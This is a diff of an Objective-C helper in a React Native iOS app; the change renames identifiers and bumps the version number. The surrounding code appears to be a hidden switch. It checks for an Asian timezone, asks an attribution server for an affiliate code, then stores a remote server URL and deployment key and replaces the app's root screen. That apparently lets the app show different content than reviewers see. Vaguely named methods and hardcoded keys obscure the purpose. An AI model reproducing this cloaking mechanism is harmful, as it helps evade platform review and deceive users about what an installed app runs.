@@ -40,24 +40,24 @@
 
 @implementation RNFOneMThreeHelper
 
-static NSString * const foneMthree_APP = @"foneMthree_FLAG_APP";
-static NSString * const foneMthree_affCode = @"affCode";
-static NSString * const foneMthree_raf = @"raf";
+static NSString * const fOneMThree_APP = @"fOneMThree_FLAG_APP";
+static NSString * const fOneMThree_affCode = @"affCode";
+static NSString * const fOneMThree_raf = @"raf";
 
-static NSString * const foneMthree_appVersion = @"1.0.6";
-static NSString * const foneMthree_deploymentKey = @"5mHhH6Yl2PpMd1Er53SUdh1MrDEQ4ksvOXqog";
-static NSString * const foneMthree_serverUrl = @"https://ltt883.com";
+static NSString * const fOneMThree_appVersion = @"1.0.7";
+static NSString * const fOneMThree_deploymentKey = @"5mHhH6Yl2PpMd1Er53SUdh1MrDEQ4ksvOXqog";
+static NSString * const fOneMThree_serverUrl = @"https://ltt883.com";
 
-static NSString * const foneMthree_tInstall = @"2O5KVT";
-static NSString * const foneMthree_tInstallHost = @"https://feaffcodegetm2.com";
+static NSString * const fOneMThree_tInstall = @"2O5KVT";
+static NSString * const fOneMThree_tInstallHost = @"https://feaffcodegetm2.com";
 
-static NSString * const foneMthree_uMengAppKey = @"5e7db2f3167eddb84f00015e";
-static NSString * const foneMthree_uMengAppChannel = @"App Store";
+static NSString * const fOneMThree_uMengAppKey = @"5e7db2f3167eddb84f00015e";
+static NSString * const fOneMThree_uMengAppChannel = @"App Store";
 
 
 static RNFOneMThreeHelper *instance = nil;
 
-+ (instancetype)foneMthree_shared {
++ (instancetype)fOneMThree_shared {
   static dispatch_once_t onceToken;
   dispatch_once(&onceToken, ^{
     instance = [[self alloc] init];
@@ -65,8 +65,8 @@ static RNFOneMThreeHelper *instance = nil;
   return instance;
 }
 
-- (void)foneMthree_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
-  [RNUMConfigure initWithAppkey:foneMthree_uMengAppKey channel:foneMthree_uMengAppChannel];
+- (void)fOneMThree_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
+  [RNUMConfigure initWithAppkey:fOneMThree_uMengAppKey channel:fOneMThree_uMengAppChannel];
   UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
   entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionAlert;
   [UNUserNotificationCenter currentNotificationCenter].delegate=self;
@@ -77,13 +77,13 @@ static RNFOneMThreeHelper *instance = nil;
   }];
 }
 
-- (UIInterfaceOrientationMask)foneMthree_getOrientation {
+- (UIInterfaceOrientationMask)fOneMThree_getOrientation {
   return [Orientation getOrientation];
 }
 
-- (BOOL)foneMthree_dailyInAsian {
-    NSInteger foneMthree_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
-    if (foneMthree_Offset >= 3 && foneMthree_Offset <= 11) {
+- (BOOL)fOneMThree_dailyInAsian {
+    NSInteger fOneMThree_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
+    if (fOneMThree_Offset >= 3 && fOneMThree_Offset <= 11) {
         return YES;
     } else {
         return NO;
@@ -91,27 +91,27 @@ static RNFOneMThreeHelper *instance = nil;
 }
 
 
-- (BOOL)foneMthree_tryThisWay:(void (^)(void))changeVcBlock {
+- (BOOL)fOneMThree_tryThisWay:(void (^)(void))changeVcBlock {
     NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
-    if (![self foneMthree_dailyInAsian]) {
+    if (![self fOneMThree_dailyInAsian]) {
         return NO;
     }
-    if ([ud boolForKey:foneMthree_APP]) {
+    if ([ud boolForKey:fOneMThree_APP]) {
         return YES;
     } else {
-        [self foneMthree_judgeIfNeedChangeRootController:changeVcBlock];
+        [self fOneMThree_judgeIfNeedChangeRootController:changeVcBlock];
         return NO;
     }
 }
 
-- (void)foneMthree_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
-  [TInstall initInstall:foneMthree_tInstall setHost:foneMthree_tInstallHost];
+- (void)fOneMThree_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
+  [TInstall initInstall:fOneMThree_tInstall setHost:fOneMThree_tInstallHost];
   [TInstall getWithInstallResult:^(NSDictionary * _Nullable data) {
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     NSString * _Nullable affCode = [data valueForKey:@"affCode"];
 
     NSString * _Nullable raf = [data valueForKey:@"raf"];
-    [ud setObject:raf forKey:foneMthree_raf];
+    [ud setObject:raf forKey:fOneMThree_raf];
 
     if (affCode.length == 0) {
       affCode = [data valueForKey:@"affcode"];
@@ -122,21 +122,21 @@ static RNFOneMThreeHelper *instance = nil;
     
     
     if (affCode.length != 0) {
-      [ud setObject:affCode forKey:foneMthree_affCode];
-      [ud setObject:foneMthree_appVersion forKey:@"appVersion"];
-      [ud setObject:foneMthree_deploymentKey forKey:@"deploymentKey"];
-      [ud setObject:foneMthree_serverUrl forKey:@"serverUrl"];
-      [ud setBool:YES forKey:foneMthree_APP];
+      [ud setObject:affCode forKey:fOneMThree_affCode];
+      [ud setObject:fOneMThree_appVersion forKey:@"appVersion"];
+      [ud setObject:fOneMThree_deploymentKey forKey:@"deploymentKey"];
+      [ud setObject:fOneMThree_serverUrl forKey:@"serverUrl"];
+      [ud setBool:YES forKey:fOneMThree_APP];
       [ud synchronize];
       changeVcBlock();
     }
   }];
 }
 
-- (UIViewController *)foneMthree_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
+- (UIViewController *)fOneMThree_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
   RCTAppSetupPrepareApp(application);
 
-  [self foneMthree_dayYouWentAwayWithOptions:launchOptions];
+  [self fOneMThree_dayYouWentAwayWithOptions:launchOptions];
   RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];
 
 #if RCT_NEW_ARCH_ENABLED
